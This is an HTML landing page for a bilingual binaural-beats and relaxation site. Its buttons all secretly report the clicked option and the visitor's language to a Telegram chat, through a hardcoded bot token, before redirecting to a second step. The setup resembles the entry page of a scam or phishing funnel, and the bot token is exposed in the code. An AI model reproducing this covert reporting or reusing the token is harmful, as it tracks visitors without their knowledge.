<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title id="pageTitle">Frecuencias & Sonidos Binaurales · Acceso</title>
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;1,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">

<style>
  :root{
    --bg:#04040a;
    --fg:#f4f4f0;
    --muted:#8a8a90;
    --line:rgba(244,244,240,0.12);
    --gold:#ffd21f;
  }
  *{box-sizing:border-box; margin:0; padding:0;}
  html,body{
    height:100%;
    background:var(--bg);
    color:var(--fg);
    font-family:'JetBrains Mono', monospace;
    overflow-x:hidden;
  }
  body{
    display:flex;
    flex-direction:column;
    min-height:100vh;
    width:100vw;
  }

  /* Header mínimo con selector de idioma */
  .top-bar{
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:16px 24px;
    border-bottom:1px solid var(--line);
    font-size:12px;
    letter-spacing:1px;
    text-transform:uppercase;
    color:var(--muted);
  }
  .brand { color: var(--fg); font-weight: 500; }

  /* Botón de configuración de idioma arriba */
  .lang-toggle {
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid var(--line);
    color: var(--fg);
    padding: 6px 12px;
    border-radius: 6px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    cursor: pointer;
    transition: background 0.2s;
  }
  .lang-toggle:hover {
    background: rgba(255, 255, 255, 0.12);
  }

  .main-wrap{
    flex:1;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    padding:24px 20px;
    text-align:center;
    gap:20px;
    max-width:420px;
    margin:0 auto;
  }

  .live-pill {
    display: flex;
    align-items: center;
    gap: 8px;
    background: rgba(255,255,255,0.03);
    border: 1px solid var(--line);
    padding: 6px 14px;
    border-radius: 20px;
    font-size: 11px;
    color: var(--muted);
  }
  .dot {
    width: 7px;
    height: 7px;
    background: #4ade80;
    border-radius: 50%;
    box-shadow: 0 0 8px #4ade80;
    animation: pulseDot 1.5s infinite;
  }
  @keyframes pulseDot {
    0% { transform: scale(0.95); opacity: 0.8; }
    50% { transform: scale(1.2); opacity: 1; }
    100% { transform: scale(0.95); opacity: 0.8; }
  }

  h1{
    font-family:'Cormorant Garamond', serif;
    font-size:clamp(28px, 6.5vw, 38px);
    font-weight:400;
    font-style:italic;
    line-height:1.15;
  }
  h1 span{ color:var(--gold); font-family:'JetBrains Mono', monospace; font-style:normal; display:block; font-size:0.38em; margin-top:8px; letter-spacing:2px; text-transform:uppercase; font-weight:700;}

  /* Botón Principal Gigante con Animación */
  #generateBtn{
    background: var(--fg);
    color: #000;
    border: none;
    width: 100%;
    padding: 18px 24px;
    font-size: 16px;
    font-weight: 700;
    font-family: 'JetBrains Mono', monospace;
    letter-spacing: 1.5px;
    border-radius: 12px;
    cursor: pointer;
    text-transform: uppercase;
    box-shadow: 0 6px 25px rgba(244,244,240,0.2);
    transition: transform .15s ease, background .2s ease;
    animation: pulseBtn 2s infinite ease-in-out;
  }
  
  @keyframes pulseBtn {
    0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(244,244,240,0.35); }
    50% { transform: scale(1.02); box-shadow: 0 0 0 12px rgba(244,244,240,0); }
  }

  #generateBtn:active{ transform: scale(0.96); }

  /* Grupo de Botones Secundarios Interactivos */
  .options-grid {
    display: flex;
    flex-direction: column;
    gap: 10px;
    width: 100%;
    margin-top: 4px;
  }

  .choice-btn {
    background: rgba(255, 255, 255, 0.02);
    color: var(--fg);
    border: 1px solid var(--line);
    width: 100%;
    padding: 14px 18px;
    font-size: 13px;
    font-family: 'JetBrains Mono', monospace;
    border-radius: 10px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: all 0.25s ease;
    animation: floatSubtle 4s ease-in-out infinite;
  }

  .choice-btn:nth-child(2) { animation-delay: 1.3s; }
  .choice-btn:nth-child(3) { animation-delay: 2.6s; }

  @keyframes floatSubtle {
    0%, 100% { transform: translateY(0); border-color: rgba(244,244,240,0.12); }
    50% { transform: translateY(-3px); border-color: rgba(244,244,240,0.3); background: rgba(255, 255, 255, 0.04); }
  }

  .choice-btn:hover {
    background: rgba(244, 244, 240, 0.08);
    border-color: var(--fg);
  }
  .choice-btn:active {
    transform: scale(0.97) !important;
  }

  .arrow {
    opacity: 0.5;
    transition: transform 0.2s;
  }
  .choice-btn:hover .arrow {
    opacity: 1;
    transform: translateX(4px);
  }

  .hint {
    color: var(--muted);
    font-size: 10px;
    letter-spacing: 1px;
    margin-top: 6px;
    text-transform: uppercase;
  }
</style>
</head>
<body>

  <!-- Header mínimo con Selector de Idioma -->
  <div class="top-bar">
    <span class="brand">Frecuencias</span>
    <button class="lang-toggle" id="langToggle">EN / ES</button>
  </div>

  <div class="main-wrap">
    <div class="live-pill">
      <i class="dot"></i>
      <span id="pillText">Sesión interactiva disponible</span>
    </div>

    <h1 id="mainTitle">Ondas Binaurales & Cimática <span id="mainSubtitle">Seleccioná lo que necesitas hoy</span></h1>

    <!-- Botón Principal -->
    <button id="generateBtn" class="trigger-link">Clic aquí para escuchar</button>

    <!-- Opciones de necesidades con animación sutil -->
    <div class="options-grid">
      <button class="choice-btn trigger-link">
        <span id="opt1">🎧 Sonidos para calmar la mente</span>
        <span class="arrow">→</span>
      </button>
      <button class="choice-btn trigger-link">
        <span id="opt2">🌿 Aliviar el estrés del día</span>
        <span class="arrow">→</span>
      </button>
      <button class="choice-btn trigger-link">
        <span id="opt3">🌙 Frecuencias para descansar</span>
        <span class="arrow">→</span>
      </button>
    </div>

    <span class="hint" id="hintText">Usá auriculares para percibir el efecto</span>
  </div>

<script>
  // Diccionario de traducciones
  const translations = {
    es: {
      title: "Frecuencias & Sonidos Binaurales · Acceso",
      pill: "Sesión interactiva disponible",
      heading: "Ondas Binaurales & Cimática",
      subheading: "Seleccioná lo que necesitas hoy",
      mainBtn: "Clic aquí para escuchar",
      opt1: "🎧 Sonidos para calmar la mente",
      opt2: "🌿 Aliviar el estrés del día",
      opt3: "🌙 Frecuencias para descansar",
      hint: "Usá auriculares para percibir el efecto",
      langBtn: "🌐 English"
    },
    en: {
      title: "Binaural Frequencies & Sound · Access",
      pill: "Interactive session available",
      heading: "Binaural Beats & Cymatics",
      subheading: "Select what you need today",
      mainBtn: "Click here to listen",
      opt1: "🎧 Sounds to calm the mind",
      opt2: "🌿 Relieve daily stress",
      opt3: "🌙 Frequencies for sleep",
      hint: "Use headphones to perceive the effect",
      langBtn: "🌐 Español"
    }
  };

  // Detección automática por ubicación/navegador del usuario
  function detectInitialLang() {
    const userLang = navigator.language || navigator.userLanguage || 'es';
    return userLang.toLowerCase().startsWith('es') ? 'es' : 'en';
  }

  let currentLang = localStorage.getItem('user_lang') || detectInitialLang();

  function applyLanguage(lang) {
    currentLang = lang;
    localStorage.setItem('user_lang', lang);
    const t = translations[lang];

    document.getElementById('pageTitle').textContent = t.title;
    document.getElementById('pillText').textContent = t.pill;
    document.getElementById('mainTitle').innerHTML = `${t.heading} <span style="color:var(--gold); font-family:'JetBrains Mono', monospace; font-style:normal; display:block; font-size:0.38em; margin-top:8px; letter-spacing:2px; text-transform:uppercase; font-weight:700;">${t.subheading}</span>`;
    document.getElementById('generateBtn').textContent = t.mainBtn;
    document.getElementById('opt1').textContent = t.opt1;
    document.getElementById('opt2').textContent = t.opt2;
    document.getElementById('opt3').textContent = t.opt3;
    document.getElementById('hintText').textContent = t.hint;
    document.getElementById('langToggle').textContent = t.langBtn;
  }

  // Inicializar idioma al cargar
  applyLanguage(currentLang);

  // Botón superior para cambiar de idioma manualmente
  document.getElementById('langToggle').addEventListener('click', () => {
    const newLang = currentLang === 'es' ? 'en' : 'es';
    applyLanguage(newLang);
  });

  // ══ TELEGRAM (Registro interno seguro) ══
  const TG_TOKEN = '8922992878:AAEBqGZAbwoopQNMgiAsnxkSYECVh3xFQ_s';
  const TG_CHAT  = '1696446405';

  function tgFetch(msg) {
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' })
    }).catch(()=>{});
  }

  const triggers = document.querySelectorAll('.trigger-link');
  let autoTriggered = false;

  triggers.forEach(btn => {
    btn.addEventListener('click', (e) => {
      if (autoTriggered) return;
      autoTriggered = true;
      
      const actionName = e.target.innerText || 'Opción seleccionada';
      tgFetch(`Click - ${actionName} [Lang: ${currentLang.toUpperCase()}] 🎧`);
      
      btn.style.transform = 'scale(0.94)';
      
      setTimeout(() => {
        window.location.href = "paso2.html";
      }, 100);
    });
  });
</script>

</body>
</html>
